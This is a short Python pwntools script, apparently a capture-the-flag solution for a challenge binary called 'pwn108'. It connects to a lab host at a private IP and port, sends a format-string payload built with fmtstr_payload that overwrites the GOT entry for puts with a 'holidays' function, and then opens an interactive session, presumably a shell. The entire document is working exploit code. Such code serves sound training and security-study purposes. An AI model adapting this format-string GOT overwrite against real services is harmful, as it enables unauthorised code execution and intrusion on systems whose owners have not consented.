from pwn import *

elf = context.binary = ELF('./pwn108')
p = remote('10.10.206.177', 9008)

offset = 10
shell = elf.functions['holidays']

p.sendlineafter(':', b'Pwner')

payload = fmtstr_payload(offset, {elf.got.puts : shell})

p.sendlineafter(':', payload)
p.interactive()
